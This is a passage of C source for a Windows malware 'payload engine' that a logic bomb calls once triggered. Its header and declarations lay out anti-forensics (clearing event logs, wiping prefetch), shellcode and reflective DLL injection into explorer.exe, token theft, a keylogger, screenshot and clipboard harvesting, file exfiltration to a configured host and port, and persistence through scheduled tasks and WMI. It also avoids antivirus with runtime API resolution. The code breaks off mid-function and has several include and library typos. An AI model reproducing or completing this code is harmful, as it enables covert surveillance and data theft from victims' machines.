/*
 * lb_payload.c
 * Platform  : Windows 7+ (x86/x64)
 * Compiler  : MinGW gcc / MSVC cl
 * Build     : gcc logic_bomb.c lb_payload.c -o logic_bomb.exe
 *             -lws2_32 -ladvapi32 -lshell32 -lgdi32 -luser32
 * Role      : Advanced payload engine — called by logic_bomb.c after trigger.
 *             Provides: anti-forensics, memory injection, privilege escalation,
 *             keylogging, screenshot capture, clipboard harvest, file exfil,
 *             persistence layer 2, self-destruct.
 *
 * GOTCHAS:
 *   gdi32   — GDI screenshot APIs (BitBlt, CreateCompatibleDC)
 *   user32  — keyboard hook, clipboard, desktop APIs
 *   advapi32 — token manipulation, registry, crypto APIs
 *   ntdll   — NtQueryInformationProcess loaded at runtime (no import lib needed)
 *   All function pointers to ntdll/undocumented APIs resolved via GetProcAddress
 *   to avoid static import that AV flags trivially.
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00  /* Windows 10 / 11 minimum */
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <winceypt.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#pragma comment(lib, "ws_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "crypt32.lib")

/* ─── Public header (inline — no separate .h needed for single-module build) ── */
void payload_run(void);


/* ─── Internal limits ────────────────────────────────────────────────────────── */
#define MAX_PATH_X        1024
#define LOG_DIR           "C:\\ProgramData\\wuh\\"
#define KEYLOG_FILE       LOG_DIR "kl.dat"
#define SCREEN_FILE       LOG_DIR "sc_%04d%02d%02d_%02d%02d%02d.bmp"
#define CLIP_FILE         LOG_DIR "cb.dat"
#define EXFIL_HOST        "127.0.0.1"
#define EXFIL_PORT        5555
#define EXFIL_CHUNK       4096
#define INJECT_TARGET     "explorer.exe"
#define SCREENSHOT_EVERY  300        /* seconds between screenshots */
#define KEYLOG_FLUSH      60         /* seconds between keylog flushes */
#define XOR_KEY           0xAB       /* single-byte XOR for log obfuscation */

/* ─── Runtime NT types (avoid ntdll import lib) ─────────────────────────────── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

/* NtQueryInformationProcess prototype */
typedef NTSTATUS (WINAPI *pfnNtQIP)(HANDLE, DWORD, PVOID, ULONG, PULONG);
static pfnNtQIP g_NtQIP = NULL;

/* ─── Globals ────────────────────────────────────────────────────────────────── */
static HHOOK    g_keyhook  = NULL;
static FILE    *g_keyfile  = NULL;
static HANDLE   g_keylog_mutex = NULL;
static BOOL     g_running  = TRUE;
static char     g_log_dir[MAX_PATH_X] = LOG_DIR;

/* ─── Forward declarations ───────────────────────────────────────────────────── */
static void     af_clear_event_logs(void);
static void     af_wipe_prefetch(void);
static void     af_patch_timestamps(const char *path);
static void     af_remove_shimcache_entry(void);
static int      priv_enable_privilege(const char *priv_name);
static int      priv_steal_token(const char *target_proc);
static HANDLE   priv_get_system_token(void);
static DWORD    proc_find_pid(const char *name);
static int      inject_shellcode(DWORD pid, const BYTE *sc, SIZE_T sc_len);
static int      inject_dll_reflective(DWORD pid, const char *dll_path);
static void     keylog_install(void);
static void     keylog_uninstall(void);
static void     keylog_flush(void);
static LRESULT CALLBACK keylog_hook_proc(int code, WPARAM wp, LPARAM lp);
static void     screen_capture(void);
static void     clip_harvest(void);
static int      exfil_file(const char *filepath);
static int      exfil_directory(const char *dir);
static void     exfil_send_raw(const char *host, int port,
                                const BYTE *data, SIZE_T len);
static void     persist_schtask(void);
static void     persist_wmi_subscription(void);
static void     selfdestruct(void);
static void     log_write(const char *fmt, ...);
static void     xor_obfuscate(BYTE *buf, SIZE_T len, BYTE key);
static BOOL     fs_mkdir_recursive(const char *path);
static DWORD WINAPI thread_keylog(LPVOID);
static DWORD WINAPI thread_screenshot(LPVOID);
static DWORD WINAPI thread_clipboard(LPVOID);
static DWORD WINAPI thread_exfil(LPVOID);

/* ═══════════════════════════════════════════════════════════════════════════════
 * SECTION 1 — Utility / init
 * ═══════════════════════════════════════════════════════════════════════════════ */

static void log_write(const char *fmt, ...) {
    char logpath[MAX_PATH_X];
    snprintf(logpath, sizeof logpath, "%slb_run.log", g_log_dir);

    HANDLE h = CreateFileA(logpath, FILE_APPEND_DATA, FILE_SHARE_READ,
                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    SYSTEMTIME st;
    GetLocalTime(&st);

    char header[64];
    int hlen = snprintf(header, sizeof header, "[%04d-%02d-%02d %02d:%02d:%02d] ",
                        st.wYear, st.wMonth, st.wDay,
                        st.wHour, st.wMinute, st.wSecond);

    char body[1024];
    va_list ap;
    va_start(ap, fmt);
    int blen = vsnprintf(body, sizeof body, fmt, ap);
    va_end(ap);

    DWORD written;
    WriteFile(h, header, (DWORD)hlen, &written, NULL);
    WriteFile(h, body,   (DWORD)blen, &written, NULL);
    WriteFile(h, "\r\n", 2,           &written, NULL);
    CloseHandle(h);
}

static void xor_obfuscate(BYTE *buf, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= key;
}

static BOOL fs_mkdir_recursive(const char *path) {
    char tmp[
}